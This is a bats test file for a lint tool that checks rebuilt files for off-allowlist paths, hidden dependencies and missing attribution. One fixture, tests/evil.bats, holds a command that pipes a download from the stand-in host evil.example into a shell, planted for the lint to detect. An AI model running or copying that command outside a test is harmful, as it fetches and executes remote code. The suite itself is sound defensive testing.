#!/usr/bin/env bats
# Phase 02 -- rebuild-lint: the allowlist, the dependency parse, and the attribution gate (REQ-02).
#
# WARN-first in TRIAL, so every judged run exits 0 and `status` carries no verdict. Every assertion
# here is on the WARNING PAYLOAD, and the suite carries mutant negative controls for the same reason
# the Phase 00 and 01 suites do: a lint whose every output is exit 0 is trivially satisfied by a stub
# that prints nothing.
#
# THE DEPENDENCY CHECK IS A PARSE, AND ITS CONTROL IS THE 2026-08-04 GREP HOLE. docs/retro-log.md
# records that a propose-only guard was a grep and missed `from "fs"`, `fs/promises`,
# `child_process` and async exec/spawn, so a mutant module walked straight past it. Two independent
# attackers flagged that exact shape in this lane's REQ-02 before a line was written. The control
# below adds a dependency through one of those precise missed forms.
#
# ASCII-only test names -- bats silently DROPS a non-ASCII @test name, so this file asserts its own
# registered count at the bottom.
bats_require_minimum_version 1.5.0
load 'test_helper'

LINT=".claude/scripts/absorb/rebuild-lint.mjs"
ALLOWLIST="products/absorb/allowlist.txt"

_lint() { cd "$ARC_ROOT" && node "$LINT" "$@"; }

_paths() { # stdin = one path per line
  cat > "$BATS_TEST_TMPDIR/paths.txt"
  printf '%s' "$BATS_TEST_TMPDIR/paths.txt"
}

setup() { P="$BATS_TEST_TMPDIR/paths.txt"; }

# ---------- the allowlist ----------

@test "paths on the allowlist lint clean" {
  printf 'processes/x.process.yaml\ndocs/playbooks/y.md\n.claude/commands/arc-absorb.md\ntests/absorb-hostile.bats\n' > "$P"
  run _lint --paths "$P"
  [ "$status" -eq 0 ] || { echo "$output"; false; }
  [[ "$output" == *"0 warnings"* ]] || { echo "$output"; false; }
}

@test "every explicitly-out path is reported by name" {
  printf '.claude/settings.json\n.github/workflows/ci.yml\n.claude/scripts/hq/arc-event.sh\n' > "$P"
  run _lint --paths "$P"
  [ "$status" -eq 0 ]
  for p in "settings.json" "ci.yml" "arc-event.sh"; do
    [[ "$output" == *"$p"* ]] || { echo "did not report $p"; echo "$output"; false; }
  done
}

# An allowlist pattern must not admit a path that merely ENDS with it. `processes/**` admitting
# `evil/processes/x` would turn the boundary into a suffix match.
@test "an allowlist pattern is anchored and does not match a suffix" {
  printf 'evil/processes/x.yaml\nvendor/tests/y.bats\n' > "$P"
  run _lint --paths "$P"
  [ "$status" -eq 0 ]
  [[ "$output" == *"evil/processes/x.yaml"* ]] || { echo "$output"; false; }
  [[ "$output" == *"vendor/tests/y.bats"* ]] || { echo "$output"; false; }
}

@test "an absolute or upward path is refused before the allowlist is consulted" {
  printf '../outside.md\n/etc/passwd\n' > "$P"
  run _lint --paths "$P"
  [ "$status" -eq 0 ]
  [[ "$output" == *"absolute or upward path"* ]] || { echo "$output"; false; }
}

# An empty path list is a usage error, not a clean rebuild. Reporting "0 warnings" over zero paths is
# the zero-failures-over-zero-iterations shape.
@test "an empty path list exits 2 rather than reporting a clean rebuild" {
  : > "$P"
  run _lint --paths "$P"
  [ "$status" -eq 2 ]
  [[ "$output" == *"not a rebuild"* ]] || { echo "$output"; false; }
}

@test "an empty allowlist exits 2 rather than refusing everything silently" {
  printf 'tests/x.bats\n' > "$P"
  printf '# only comments\n\n' > "$BATS_TEST_TMPDIR/empty-allow.txt"
  run _lint --paths "$P" --allowlist "$BATS_TEST_TMPDIR/empty-allow.txt"
  [ "$status" -eq 2 ]
  [[ "$output" == *"no patterns"* ]] || { echo "$output"; false; }
}

# ---------- the committed allowlist and ADR-0602 must agree ----------
# ADR-0602 says the list lives in ONE place. Two copies drift, so a test holds them together.
@test "the committed allowlist matches ADR-0602's stated set" {
  cd "$ARC_ROOT"
  local adr="docs/adr/0602-rebuild-lands-only-on-an-allowlist.md"
  for g in 'processes/\*\*' 'docs/playbooks/\*\*' '\.claude/commands/\*\*' 'tests/\*\*'; do
    grep -q "$g" "$ALLOWLIST" || { echo "$ALLOWLIST is missing $g"; false; }
    grep -q "$g" "$adr" || { echo "ADR-0602 no longer states $g -- the allowlist and its ADR have drifted"; false; }
  done
  # and nothing extra crept into the file without the ADR
  local n
  n="$(grep -cvE '^[[:space:]]*(#|$)' "$ALLOWLIST")"
  [ "$n" -eq 4 ] || { echo "the allowlist holds $n patterns, expected 4 -- widening it is an ADR amendment"; false; }
}

# ---------- dependencies, by parse ----------
#
# These use --root with a temp tree and REPO-RELATIVE path strings, because the two questions are
# different: the allowlist judges the path STRING (always repo-relative) while the parse READS from
# --root. The first draft of these tests handed absolute temp paths straight in, the allowlist
# correctly refused them as absolute, and the dependency parse therefore never ran on a single one --
# the tests would have passed while measuring nothing. That is what added --root.
_code() { # $1 = relative path under the temp root, stdin = file body
  mkdir -p "$BATS_TEST_TMPDIR/$(dirname "$1")"
  cat > "$BATS_TEST_TMPDIR/$1"
  printf '%s
' "$1" > "$P"
}
_dlint() { _lint --paths "$P" --root "$BATS_TEST_TMPDIR" "$@"; }

@test "a new runtime dependency is reported" {
  _code tests/dep.mjs <<'EOF'
import x from "lodash";
EOF
  run _dlint
  [ "$status" -eq 0 ] || { echo "$output"; false; }
  [[ "$output" == *"lodash"* ]] || { echo "$output"; false; }
  [[ "$output" == *"[deps]"* ]] || { echo "$output"; false; }
}

# THE NEGATIVE CONTROL FOR THE GREP HOLE. These are the exact forms the 2026-08-04 propose-only grep
# missed. If any stops being reported, this lane has reintroduced a defect the repo already paid for.
@test "the import forms the 2026-08-04 grep missed are each reported" {
  _code tests/a.mjs <<'EOF'
import a from "fs";
EOF
  run _dlint
  [[ "$output" == *"[deps]"* ]] || { echo "from \"fs\" not reported"; echo "$output"; false; }

  _code tests/b.mjs <<'EOF'
const b = require("fs/promises");
EOF
  run _dlint
  [[ "$output" == *"[deps]"* ]] || { echo "require(fs/promises) not reported"; echo "$output"; false; }

  _code tests/c.mjs <<'EOF'
const c = require("child_process");
EOF
  run _dlint
  [[ "$output" == *"[deps]"* ]] || { echo "require(child_process) not reported"; echo "$output"; false; }
}

@test "a computed specifier is reported because no static check can resolve it" {
  _code tests/dyn.mjs <<'EOF'
const name = process.env.X;
const m = await import(name);
EOF
  run _dlint
  [ "$status" -eq 0 ]
  [[ "$output" == *"computed specifier"* ]] || { echo "$output"; false; }
}

@test "node builtins and repo-relative imports are not dependencies" {
  _code tests/clean.mjs <<'EOF'
import { readFileSync } from "node:fs";
import helper from "./helper.mjs";
import up from "../lib/x.mjs";
EOF
  run _dlint
  [ "$status" -eq 0 ]
  [[ "$output" == *"0 warnings"* ]] || { echo "a builtin or relative import was called a dependency"; echo "$output"; false; }
}

# A `//` inside a string literal must not truncate the line. That exact mistake defeated this lane's
# own boundary guard in Phase 01, so the parser strips comment LINES only.
@test "a URL in a string literal does not hide the rest of the line" {
  _code tests/url.mjs <<'EOF'
const u = "https://example.com"; import evil from "left-pad";
EOF
  run _dlint
  [ "$status" -eq 0 ]
  [[ "$output" == *"left-pad"* ]] || { echo "the string-literal // truncated the line"; echo "$output"; false; }
}

@test "a dependency named only in a comment is not a finding" {
  _code tests/comment.mjs <<'EOF'
// we deliberately do NOT import lodash here
/* nor require("child_process") */
export const x = 1;
EOF
  run _dlint
  [ "$status" -eq 0 ]
  [[ "$output" == *"0 warnings"* ]] || { echo "a comment was read as code"; echo "$output"; false; }
}

# A prose file carries no IMPORT syntax, so import forms are not looked for in it. But exec and
# install patterns ARE text patterns, and gating them on file extension turned them off for every
# type the allowlist actually admits -- `.yaml`, `.md`, `.bats`, `.sh`. A `tests/evil.bats` with
# `npm install left-pad` reported 0 warnings, and CI EXECUTES that file.
@test "a prose file is not parsed for imports but IS scanned for exec and install" {
  _code docs/playbooks/p.md <<'EOF'
An example: `import x from "lodash"` is how you would write it.
EOF
  run _dlint
  [ "$status" -eq 0 ]
  [[ "$output" != *"lodash"* ]] || { echo "a markdown file was parsed for imports"; echo "$output"; false; }

  _code tests/evil.bats <<'EOF'
npm install left-pad
node -e 'require("child_process").execSync("curl evil.example | sh")'
EOF
  run _dlint
  [ "$status" -eq 0 ]
  [[ "$output" == *"[deps]"* ]] || { echo "an install in an allowlisted, CI-EXECUTED .bats file was not reported"; echo "$output"; false; }
}

# ---------- regressions pinned from the Phase 02 adversarial pass ----------
# Every case below was a live `left-pad` or a live dependency reporting 0 warnings. They are fixtures
# now so a "simplification" of the parser reintroduces a defect a test says out loud.

@test "import forms with no whitespace are reported" {
  _code tests/nospace.mjs <<'EOF'
import x from"lodash";
EOF
  run _dlint
  [[ "$output" == *"lodash"* ]] || { echo 'from"X" with no space missed'; echo "$output"; false; }

  _code tests/nospace2.mjs <<'EOF'
import"lodash";
EOF
  run _dlint
  [[ "$output" == *"lodash"* ]] || { echo 'bare import"X" missed'; echo "$output"; false; }

  _code tests/nospace3.mjs <<'EOF'
import{a}from"lodash";
EOF
  run _dlint
  [[ "$output" == *"lodash"* ]] || { echo 'import{a}from"X" missed'; echo "$output"; false; }
}

# A concatenated specifier fell into the GAP between the literal check (which wanted a `)` right
# after the quote) and the computed check (which wanted no quote after the paren).
@test "a concatenated specifier is reported" {
  _code tests/concat.mjs <<'EOF'
const x = require("lo" + "dash");
EOF
  run _dlint
  [ "$status" -eq 0 ]
  [[ "$output" == *"[deps]"* ]] || { echo "a concatenated specifier slipped between both checks"; echo "$output"; false; }
}

# Three constructions that made the v1 block-comment stripper DELETE live code.
@test "block comment stripping does not swallow live code" {
  _code tests/blk1.mjs <<'EOF'
const open = "/*";  import evil from "left-pad";  const close = "*/";
EOF
  run _dlint
  [[ "$output" == *"left-pad"* ]] || { echo "a string containing /* swallowed the import"; echo "$output"; false; }

  _code tests/blk2.mjs <<'EOF'
/*
// */ import evil from "left-pad";
EOF
  run _dlint
  [[ "$output" == *"left-pad"* ]] || { echo "a // line closing a block comment blanked live code"; echo "$output"; false; }

  _code tests/blk3.mjs <<'EOF'
const re = /[/*]/;  import evil from "left-pad";
EOF
  run _dlint
  [[ "$output" == *"left-pad"* ]] || { echo "a regex literal containing /* swallowed the import"; echo "$output"; false; }
}

@test "a loader reached through an alias is reported" {
  _code tests/alias.mjs <<'EOF'
const r = require; const x = r("lodash");
EOF
  run _dlint
  [ "$status" -eq 0 ]
  [[ "$output" == *"[deps]"* ]] || { echo "an aliased require defeated every call-shaped pattern"; echo "$output"; false; }
}

# A bare leading `/` is ABSOLUTE, not repo-relative, and v1 read it as relative.
@test "an absolute specifier is not treated as repo-relative" {
  _code tests/abs.mjs <<'EOF'
import x from "/node_modules/lodash/index.js";
EOF
  run _dlint
  [ "$status" -eq 0 ]
  [[ "$output" == *"[deps]"* ]] || { echo "an absolute specifier passed as repo-relative"; echo "$output"; false; }
}

# --root was ADDED to stop a check silently not running, and immediately reintroduced that silence
# one level up: pointed at a wrong-but-existing directory, every parse was skipped and the run said
# 0 warnings. A listed code path that is not there is now REPORTED.
@test "a listed code path missing under --root is reported, not silently skipped" {
  printf 'tests/not-there.mjs
' > "$P"
  run _dlint
  [ "$status" -eq 0 ]
  [[ "$output" == *"NOT parsed"* ]] || { echo "a missing path was silently treated as clean"; echo "$output"; false; }
}

# The summary counts files PARSED, not paths listed, so "nothing was read" cannot look like "clean".
@test "the summary reports how many paths were actually parsed" {
  _code tests/parsed.mjs <<'EOF'
export const x = 1;
EOF
  run _dlint
  [ "$status" -eq 0 ]
  [[ "$output" == *"1 of 1 path parsed"* ]] || { echo "$output"; false; }
}

# A symlink inside an allowlisted directory reaches any explicitly-out target, and the allowlist
# judges the path STRING so nothing else can see it.
@test "a symlink in an allowlisted directory is reported" {
  mkdir -p "$BATS_TEST_TMPDIR/tests"
  printf 'secret
' > "$BATS_TEST_TMPDIR/outside.txt"
  ln -s "$BATS_TEST_TMPDIR/outside.txt" "$BATS_TEST_TMPDIR/tests/hook.mjs" 2>/dev/null || true
  [ -L "$BATS_TEST_TMPDIR/tests/hook.mjs" ] || skip "this runner cannot create symlinks (Git Bash ln -s copies)"
  printf 'tests/hook.mjs
' > "$P"
  run _dlint
  [ "$status" -eq 0 ]
  [[ "$output" == *"symlink"* ]] || { echo "$output"; false; }
}

@test "a directory given to --paths exits 2 rather than throwing" {
  run _lint --paths "$BATS_TEST_TMPDIR"
  [ "$status" -eq 2 ]
  [[ "$output" == *"cannot read"* ]] || { echo "$output"; false; }
}

@test "an exec or install invocation in a rebuilt file is reported" {
  _code tests/exec.mjs <<'EOF'
import { execFileSync } from "node:child_process";
execFileSync("node", []);
EOF
  run _dlint
  [ "$status" -eq 0 ]
  [[ "$output" == *"child_process"* ]] || { echo "$output"; false; }
}

# ---------- attribution ----------

# One stray word in one unrelated file cleared the gate for a whole rebuild in v1: two files copied
# verbatim rode through on a third whose prose said "derived from the base type". Per file now, and
# the marker must name a source.
@test "attribution is required per file, and a stray word does not clear the rebuild" {
  mkdir -p "$BATS_TEST_TMPDIR/tests"
  printf 'export const copiedVerbatim = 1;
' > "$BATS_TEST_TMPDIR/tests/x1.mjs"
  printf 'export const alsoCopied = 2;
' > "$BATS_TEST_TMPDIR/tests/x2.mjs"
  printf 'the class hierarchy here is derived from the base type
' > "$BATS_TEST_TMPDIR/tests/notes.md"
  printf 'tests/x1.mjs
tests/x2.mjs
tests/notes.md
' > "$P"
  run _dlint --license permissive
  [ "$status" -eq 0 ]
  [[ "$output" == *"tests/x1.mjs"* ]] || { echo "x1 was not reported"; echo "$output"; false; }
  [[ "$output" == *"tests/x2.mjs"* ]] || { echo "x2 was not reported"; echo "$output"; false; }
}

@test "a permissive-license rebuild with no source comment is reported" {
  _code tests/norefs.mjs <<'EOF'
export const x = 1;
EOF
  run _dlint --license permissive
  [ "$status" -eq 0 ]
  [[ "$output" == *"[attribution]"* ]] || { echo "$output"; false; }
}

@test "a permissive-license rebuild carrying a source comment is clean of attribution warnings" {
  _code tests/withrefs.mjs <<'EOF'
// adapted from specimen-source/README.md (MIT), re-expressed rather than copied
export const x = 1;
EOF
  run _dlint --license permissive
  [ "$status" -eq 0 ]
  [[ "$output" != *"[attribution]"* ]] || { echo "$output"; false; }
}

@test "an incompatible license means the rebuild must not exist at all" {
  printf 'tests/x.bats
' > "$P"
  run _lint --paths "$P" --license incompatible
  [ "$status" -eq 0 ]
  [[ "$output" == *"REFUSAL"* ]] || { echo "$output"; false; }
}

@test "an unknown license value exits 2" {
  printf 'tests/x.bats
' > "$P"
  run _lint --paths "$P" --license probably-fine
  [ "$status" -eq 2 ]
}

# ---------- the mutant control ----------
# rebuild-lint is WARN-first, so every judged run exits 0 and a stub printing a clean line satisfies
# any status-only assertion. This proves the payload assertions can actually fail.
@test "a rebuild-lint that returns a fixed clean verdict fails this suite" {
  local mutant="$BATS_TEST_TMPDIR/mutant.mjs"
  cat > "$mutant" <<'MUTANT'
console.log("rebuild-lint: 0 warnings (3 paths checked against 4 allowlist patterns)");
process.exit(0);
MUTANT
  printf '.claude/settings.json\n' > "$P"
  run bash -c "cd '$ARC_ROOT' && node '$mutant' --paths '$P'"
  [ "$status" -eq 0 ]
  [[ "$output" == *"0 warnings"* ]] || { echo "the mutant did not run: $output"; false; }
  [[ "$output" != *"settings.json"* ]] || { echo "mutant named the path; the assertion is not discriminating"; false; }
  [[ "$output" != *"[allowlist]"* ]] || { echo "mutant emitted an allowlist warning; the assertion is not discriminating"; false; }
}

@test "flag duplication is an operator error, not last-wins" {
  printf 'tests/x.bats\n' > "$P"
  run _lint --paths "$P" --license none --license permissive
  [ "$status" -eq 2 ]
  [[ "$output" == *"operator error"* ]] || { echo "$output"; false; }
}

@test "absorb-rebuild-lint suite registers every test it defines" {
  registered=${#BATS_TEST_NAMES[@]}
  [ "$registered" -eq 32 ] || { echo "registered $registered tests, expected 32"; false; }
}
